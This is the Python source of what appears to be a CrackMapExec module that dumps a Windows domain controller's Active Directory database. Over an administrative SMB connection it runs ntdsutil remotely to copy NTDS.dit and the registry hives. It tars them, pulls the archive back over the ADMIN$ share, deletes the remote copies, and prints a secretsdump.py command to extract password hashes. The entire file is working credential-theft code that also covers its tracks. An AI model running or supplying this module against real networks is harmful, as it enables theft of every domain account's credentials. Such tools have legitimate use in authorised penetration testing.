class CMEModule:
    '''
        Dump NTDS with ntdsutil
        Module by @zblurx

    '''
    name = 'ntdsutil'
    description = 'Dump NTDS with ntdsutil'
    supported_protocols = ['smb']
    opsec_safe= False #Does the module touch disk?
    multiple_hosts = False #Does it make sense to run this module on multiple hosts at a time?

    def options(self, context, module_options):
        '''
        Dump NTDS with ntdsutil
        Module by @zblurx

        TAR_NAME    Name of the tar archive
        DIR_RESULT  Local dir to write ntds dump
        '''
        self.share = "ADMIN$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
        self.dump_location = 'ntdsutil'
        self.tar_archive = 'ntdsutil.tar'
        self.dir_result = './'

        if 'TAR_NAME' in module_options:
            self.tar_archive = module_options['TAR_NAME']

        if 'DIR_RESULT' in module_options:
            self.dir_result = module_options['DIR_RESULT']

        pass


    def on_admin_login(self, context, connection):
        '''Concurrent. Required if on_login is not present. This gets called on each authenticated connection with Administrative privileges'''
        command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
        context.log.info('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
        context.log.debug('Executing command {}'.format(command))
        p = connection.execute(command, True)
        context.log.debug(p)
        if 'IFM media created successfully' in p:
            context.log.success("NTDS.dit dumped to %s%s" % (self.tmp_dir, self.dump_location))
        else:
            context.log.error("Error while dumping NTDS")
            return

        command = "powershell \"tar -C %s -cvf %s%s %s\"" % ( self.tmp_dir, self.tmp_dir, self.tar_archive, self.dump_location)
        context.log.info('Packing up into %s' % self.tar_archive)
        context.log.debug('Executing command {}'.format(command))
        p = connection.execute(command, True)
        context.log.debug(p)

        context.log.info('Copy %s to host' % self.tar_archive)
        with open(self.dir_result + self.tar_archive, 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + self.tar_archive, dump_file.write)
                context.log.success('Copied NTDS dump into %s' % self.tar_archive)
            except Exception as e:
                context.log.error('Error while get file: {}'.format(e))
                

        try:
            connection.conn.deleteFile(self.share, self.tmp_share + self.tar_archive)
            context.log.success('Deleted %s on the %s share' % (self.tar_archive, self.share))
        except Exception as e:
            context.log.error('Error deleting {} file on share {}: {}'.format(self.tar_archive,self.share, e))

        try:
            command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
            p = connection.execute(command, True)
            context.log.success('Deleted %s%s dump directory on the %s share' % (self.tmp_dir, self.dump_location, self.share))
        except Exception as e:
            context.log.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))

        context.log.highlight("""Now simply:
        tar -xf %s%s && secretsdump.py -system ntdsutil/registry/SYSTEM -security ntdsutil/registry/SECURITY -ntds ntdsutil/Active\ Directory/ntds.dit LOCAL"""% (self.dir_result, self.tar_archive))
